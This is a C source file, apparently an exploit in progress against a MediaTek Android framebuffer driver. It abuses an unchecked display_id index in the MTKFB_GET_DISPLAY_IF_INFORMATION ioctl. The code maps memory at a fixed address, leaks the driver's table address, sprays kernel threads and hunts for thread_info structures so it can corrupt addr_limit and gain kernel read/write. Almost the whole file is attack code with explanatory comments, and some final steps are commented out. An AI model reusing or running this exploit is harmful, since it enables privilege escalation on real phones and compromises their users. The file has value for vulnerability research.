#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <pthread.h>
//keen team uses 0xc8000000 ~ 0xefff0000
#define THREAD_INFO_START	0xc8000000   //huawei text start at 0xc0608000 - 0xc198273c
#define THREAD_INFO_END 	0xefff0000
typedef enum
{
    DISPIF_TYPE_DBI = 0,
    DISPIF_TYPE_DPI,
    DISPIF_TYPE_DSI,
    DISPIF_TYPE_DPI0,
    DISPIF_TYPE_DPI1,
    DISPIF_TYPE_DSI0,
    DISPIF_TYPE_DSI1,
    HDMI,
    HDMI_SMARTBOOK,
    MHL
} MTKFB_DISPIF_TYPE;

typedef enum
{
    DISPIF_MODE_VIDEO = 0,
    DISPIF_MODE_COMMAND
} MTKFB_DISPIF_MODE;

typedef struct mtk_dispif_info {
        unsigned int display_id;
        unsigned int isHwVsyncAvailable;
        MTKFB_DISPIF_TYPE displayType;
        unsigned int displayWidth;
        unsigned int displayHeight;
        unsigned int displayFormat;
        MTKFB_DISPIF_MODE displayMode;
        unsigned int vsyncFPS;
        unsigned int physicalWidth;
        unsigned int physicalHeight;
        unsigned int isConnected;
        unsigned int lcmOriginalWidth;  // this value is for DFO Multi-Resolution feature, which stores the original LCM Wdith
        unsigned int lcmOriginalHeight; // this value is for DFO Multi-Resolution feature, which stores the original LCM Height
} mtk_dispif_info_t;

#define MTK_IOR(num, dtype)     _IOR('O', num, dtype)
#define MTKFB_GET_DISPLAY_IF_INFORMATION       MTK_IOR(90, mtk_dispif_info_t)


/*
	addr(dispif_info[displayid].physicalHeight) = dispif_info + displayid * 0x34 + 0x20 
	addr'(dispif_info[displayid].physicalWidth = addr(dispif_info[displayid].physicalHeight) + 4 = dispif_info + displayid * 0x34 + 0x20 + 4
		= dispif_info + displayid * 0x34 + 0x20 + 4 + 0x100000000
		= dispif_info + displayid * 0x34 + 0x20 + 4 + (0x34 * 0x4EC4EC5 - 4)
		= dispif_info + (displayid + 0x4EC4EC5) * 0x34 + 0x20
		= dispif_info[displayid + 0x4EC4EC5].physicalHeight
*/
//struct thread_info { // always in address 0x2000 0x4000 0x6000 ... 
//	unsigned long		flags;		/* low level flags */
//	int			preempt_count;	/* 0 => preemptable, <0 => bug */ /* could be set to 0 */
//	mm_segment_t		addr_limit;	/* address limit */ /* initialized with 0xbf000000, if set to 0, means userland can read and write all addresses including kernel address*/
//	struct task_struct	*task;		/* main task structure */ /* cannot be set to 0, otherwise panic */
//	struct exec_domain	*exec_domain;	/* execution domain */
//	__u32			cpu;		/* cpu */
//	__u32			cpu_domain;	/* cpu domain */
//	struct cpu_context_save	cpu_context;	/* cpu context */
//	__u32			syscall;	/* syscall number */
//	__u8			used_cp[16];	/* thread used copro */
//	unsigned long		tp_value;
//#ifdef CONFIG_CRUNCH
//	struct crunch_state	crunchstate;
//#endif
//	union fp_state		fpstate __attribute__((aligned(8)));
//	union vfp_state		vfpstate;
//#ifdef CONFIG_ARM_THUMBEE
//	unsigned long		thumbee_state;	/* ThumbEE Handler Base register */
//#endif
//	struct restart_block	restart_block;
//	int			cpu_excp;
//	void			*regs_on_excp;
//};
static int fd;
static int dispif_info_addr = 0;
static int *display_id_candidate = NULL;
static int display_id_candidate_length = 0;
static int MAX_THREAD_NUM = 0;
void get_dispif_info_addr() //from testing the range is 0xc0000000 ~ 0xc3000000
{
	struct mtk_dispif_info ioctl_arg;
	ioctl_arg.display_id = 0xA04EC4EC; //0xA04EC4EC * 0x34 = 0x208FFFFFF0, so the addr is 0x8FFFFFF0, in the mapped area
	void *addr = mmap((unsigned long *)0x50000000, 0x3000000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
	if((unsigned long)addr != 0x50000000)
	{
		printf("[-] mmap failed.\n");
		dispif_info_addr = 0;
	}
	else printf("[+] mmap done.\n");
	memset(addr, 0x41, 0x3000000);
	unsigned int cmd = MTKFB_GET_DISPLAY_IF_INFORMATION;
	if(ioctl(fd, cmd, &ioctl_arg))
	{
                printf("[-] MTKFB_GET_DISPLAY_IF_INFORMATION failed (%s)\n", strerror(errno));
		dispif_info_addr = 0;
        }
        printf("[+] MTKFB_GET_DISPLAY_IF_INFORMATION done\n");
	unsigned long j;
	for(j = 0; j < 0x3000000; j = j + 4)
	{
		if(*(unsigned long *)((unsigned long)addr + j) != 0x41414141)
		{
			dispif_info_addr = (unsigned long)addr + j - 0x20 - 0xA04EC4EC * 0x34;
		}
	}
}

void obtain_display_id_candidate(void)
{
	int max_num = (int)((THREAD_INFO_END - THREAD_INFO_START)/0x1a000) + 1; //least common multiple of 0x34 and 0x2000
	unsigned long display_id = 0x80000000; // why 80000000?
	int cur_num = 0;
	unsigned long cur_thread_info_addr = THREAD_INFO_START;
	display_id_candidate = malloc(4 * max_num);

	int i;
	for(i = 0; i < max_num; i ++) display_id_candidate[i] = 0;
	
	while(1)
	{
		if((dispif_info_addr + 0x34 * display_id + 0x20) > THREAD_INFO_START && (dispif_info_addr + 0x34 * display_id + 0x20) < THREAD_INFO_START + 0x100)
			break;
		display_id++;
	}
	printf("display_id is : %x\n", (unsigned int)display_id);

	while(cur_thread_info_addr < THREAD_INFO_END)
	{
		//if(((dispif_info_addr + 0x34 * display_id + 0x20) & 0x1fff) == 0x1ff8)
		if(((dispif_info_addr + 0x34 * display_id + 0x28) % 0x100000000 % 0x2000) == 0)
		{
			display_id_candidate[cur_num] = display_id;
			cur_num++;
		}
		display_id ++;
		cur_thread_info_addr += 0x34;
	}
	display_id_candidate_length = cur_num;
}

static int write_thread_ready = 0;
static pthread_mutex_t is_thread_desched_lock = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t is_thread_desched;
void * spraying_thread(void *arg)
{
	while(!write_thread_ready)
	{
		pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);
		
		int x = *((unsigned int *) 0xc0000000);
		write_thread_ready = 1;
		break;
	}
	printf("!!!!!!! could write now !!!!!!!\n");
}

int main(void)
{
	fd = open("/dev/graphics/fb0", O_RDONLY);
	if(fd < 0){
		printf("[-] failed to open device (%s)\n", strerror(errno));
		goto out;
	}
	else printf("[+] device opened @ %d\n", fd);
	
	mtk_dispif_info_t my_dispif;
	memset(&my_dispif, 0, sizeof(my_dispif));
	my_dispif.display_id = 1;
	if(ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &my_dispif))
	{
		printf("[-] MTKFB_GET_DISPLAY_IF_INFORMATION failed (%s)\n", strerror(errno));
		goto close_out;
	}
	printf("[+] MTKFB_GET_DISPLAY_IF_INFORMATION done\n");

	get_dispif_info_addr();	
	
	if(dispif_info_addr == 0)
		printf("[-] Failed to get dispif_info address.\n");
	else printf("[+] Got dispif_info %p\n", (void *)dispif_info_addr);

	obtain_display_id_candidate();

/*	MAX_THREAD_NUM = 300;

	pthread_t tid;
	pthread_mutex_lock(&is_thread_desched_lock);
	int i;
	for(i = 0; i < MAX_THREAD_NUM; i++)
		pthread_create(&tid, 0, spraying_thread, (void *)NULL);
*/

	int i = 0;
	pthread_t tid;
	pthread_mutex_lock(&is_thread_desched_lock);
	while( pthread_create(&tid, 0, spraying_thread, (void *)NULL) == 0)
	{
		i++;
		printf("[+] create thread done.\n");
	}
printf("~~~ total created thread %d\n", i);

	while(1)
	{
	        memset(&my_dispif, 0, sizeof(my_dispif));
		i = rand()%display_id_candidate_length;
        	my_dispif.display_id = display_id_candidate[i];

printf("--- %p -------- %p\n", my_dispif.display_id, (dispif_info_addr + 0x34*my_dispif.display_id + 0x20)%0x100000000);
        	if(ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &my_dispif))
		{
			printf("[-] MTKFB_GET_DISPLAY_IF_INFORMATION failed (%s)\n", strerror(errno));
			goto close_out;
		}
		printf("[+] MTKFB_GET_DISPLAY_IF_INFORMATION done\n");

		if(my_dispif.lcmOriginalHeight == 0xbf000000)
		{
			printf("find one !!!\n");
			break;
		}
	}
	//pthread_cond_broadcast(&is_thread_desched);
close_out:
	close(fd);
out:
	return 0;
}
